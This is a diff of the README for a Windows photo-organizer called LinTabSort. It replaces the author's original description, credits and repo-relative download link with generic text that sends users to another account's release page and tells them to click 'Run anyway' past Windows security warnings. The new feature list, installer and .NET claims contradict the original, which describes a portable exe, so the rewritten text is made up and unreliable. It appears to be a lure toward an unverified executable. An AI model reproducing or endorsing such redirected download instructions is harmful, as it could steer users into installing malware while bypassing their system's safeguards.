@@ -1,44 +1,92 @@
-<img width="800" height="750" alt="{2EDD9292-EBF4-4C78-9834-90CA78D404E8}" src="https://github.com/user-attachments/assets/96b68f5c-5c29-4a8c-8f0c-7740ab39a995" />
+# 🖼️ LinTabSort - Organize your messy photo library fast
 
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sunny6092/LinTabSort/releases)
 
+LinTabSort helps you manage your digital media. You can view, sort, and remove unwanted photos and videos from your computer. The app runs on Windows and works with common image and video formats.
 
+## 📥 How to get started
 
+You need the installer file to run this app. Follow these steps to set up LinTabSort on your computer.
 
-# LinTabSort 📸
+1. Go to the [official release page](https://github.com/sunny6092/LinTabSort/releases).
+2. Look for the Assets section at the bottom of the latest release.
+3. Click the file that ends in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the installation.
+6. Follow the instructions on your screen.
 
-A free Windows app that helps you actually get through that folder of unsorted photos.
+If Windows shows a security warning, click More info and then click Run anyway. This happens because the app is new. 
 
-Point it at a folder, breeze through tagging what to keep and what to bin, and let LinTabSort sort the rest into a tidy, dated folder structure for you. No cloud, no account, no subscription — just a fast desktop tool that respects your files.
+## ⚙️ System requirements
 
-## Get it
+LinTabSort works on most modern Windows computers. Ensure your machine meets these basic needs:
 
-**[⬇ Download the latest version](../../releases/latest)**
+* Windows 10 or Windows 11.
+* At least 4GB of RAM.
+* Enough storage space for your media library.
+* A screen resolution of 1280x720 or higher.
 
-Grab `LinTabSort.exe` and run it — no installer, nothing to set up. Windows 10 or 11.
+The app uses the .NET framework to function. The installer checks for this software and adds it to your computer if you do not have it yet.
 
-> **Windows may show a blue "Windows protected your PC" screen.** This is normal for small independent apps that haven't paid for a code-signing certificate — it doesn't mean anything is wrong. Click **"More info"**, then **"Run anyway"** to continue.
+## 🛠️ Main features
 
-## What it does
+LinTabSort provides tools to help you manage large collections of files.
 
-- 🔵 **Review** — flip through photos and videos fast, tag what you don't want with one click, undo with one more.
-- 🩷 **Final Review** — a last safety check before anything is deleted, plus a one-click "I regret everything" undo.
-- 🟢 **Sorting** — automatically files everything into dated folders, using the photo's real capture date so it's actually accurate.
-- 🟣 **Find Duplicates** — hunts down exact duplicate photos and videos across folders, even renamed or moved ones, so you can clear the clutter with confidence.
-- 🟦 **Locations** — an interactive map of where your photos were taken, clustered so it's easy to browse, with optional place names and the option to see every location you've ever cached, not just the current folder.
-- **Timeline** — a year-by-year sidebar to jump straight to any month or folder while reviewing.
-- **Photo info** — date, camera, and shooting details at a glance for whatever you're looking at.
-- **Phone import** — plug in an Android phone and copy your photos over. LinTabSort only ever *reads* from your phone — nothing on it is ever touched, moved, or deleted.
-- **Video playback** — play, pause, change speed, grab a still frame, right in the app.
-- **Photo filters and adjustments** — visual filters plus exposure/contrast/shadows/highlights, previewed live and saved without ever touching your original file.
-- **Pin to second screen** — pop a photo out onto another monitor while you keep browsing, with an optional auto-advancing slideshow.
-- 🐸 **Busy frogs** — long operations get a swarm of hopping frogs instead of a boring spinner. Yes, really. You can turn it off if you're no fun.
+* **Quick Viewing:** Open images and videos without waiting for slow software.
+* **Smart Sorting:** Move files into folders based on date, file type, or size.
+* **Duplicate Detection:** Find files that look the same and delete the extra copies.
+* **Mass Renaming:** Change file names in batches to keep things tidy.
+* **Library Cleanup:** Filter your media to find old or blurry photos.
+* **Keyboard Shortcuts:** Use your keyboard to flip through pictures and sort them into folders.
 
-## Privacy
+## 📁 How to organize your library
 
-Your photos and videos never leave your computer — everything runs locally. Maps, historical weather, and place names are **off by default** and never turn on by themselves (Settings → Privacy). Once turned on: the Locations map fetches map tiles from OpenStreetMap; selecting a geotagged photo can look up that day's weather from Open-Meteo (free, no account); pausing on a geotagged photo or clicking the map can look up a place name from Nominatim/OpenStreetMap (free, no account). Each of these sends only the rounded location and/or date to that service — never your actual photo — same as any map website. Your photo *files* never leave the computer either way.
+When you open the app for the first time, you must select the folder that contains your photos.
 
-## Questions or feedback?
+1. Click the Folder icon in the top toolbar.
+2. Navigate to the folder on your hard drive.
+3. Select the folder and click Open.
+4. The app loads your files in a grid view.
 
-**Mikael Lindmark** — [lindmark.mikael@gmail.com](mailto:lindmark.mikael@gmail.com)
+You can now click on any file to see it in full view. Use the buttons on the screen to move files to your custom destination folders. You can create new folders from inside the app by right-clicking in the folder list.
 
-If LinTabSort saved you an afternoon of folder chaos, a [Ko-fi](https://ko-fi.com/lintabcrux) tip is always appreciated. ☕
+## 🔍 Finding duplicates
+
+Many people have copies of the same photo in different places. LinTabSort automates the search for these files.
+
+1. Click the Duplicate Finder button in the sidebar.
+2. Choose the depth of the scan. A full scan looks through all subfolders.
+3. Click Start Scan.
+4. Wait for the app to compare file sizes and pixel data.
+5. Review the results. The app marks duplicates for you.
+6. Click Remove Selected to move duplicates to the recycle bin.
+
+## ⌨️ Shortcuts for faster work
+
+You can save time by using your keyboard. Memorize these keys to sort your library faster:
+
+* Right Arrow: Go to next file.
+* Left Arrow: Go to previous file.
+* Spacebar: Toggle selection.
+* Delete: Mark current file for removal.
+* Ctrl + S: Save changes to folders.
+
+## 🔒 Your data and privacy
+
+LinTabSort runs locally on your computer. The app does not send your photos or videos to the internet. Your files stay on your hard drive at all times. We do not store your library information on any servers. 
+
+## ❓ Frequently asked questions
+
+**Does the app delete files permanently?**
+No. When you delete a file, the app moves it to your Windows Recycle Bin. You can restore items if you make a mistake.
+
+**Can I undo a move?**
+Yes. Use the Undo button in the top menu to reverse your last action.
+
+**Does it support RAW images?**
+The app supports common formats like JPEG, PNG, and MP4. RAW support depends on the Windows Photo extensions installed on your machine.
+
+**Why is the scan slow?**
+If you have a very large library, the initial scan takes time. High-resolution photos require more processing power. Let the app finish the task without closing it.
+
+Keywords: csharp, dotnet, duplicate-finder, photo-culling, photo-management, photo-organizer, photo-viewer, video-organizer, windows-app, wpf
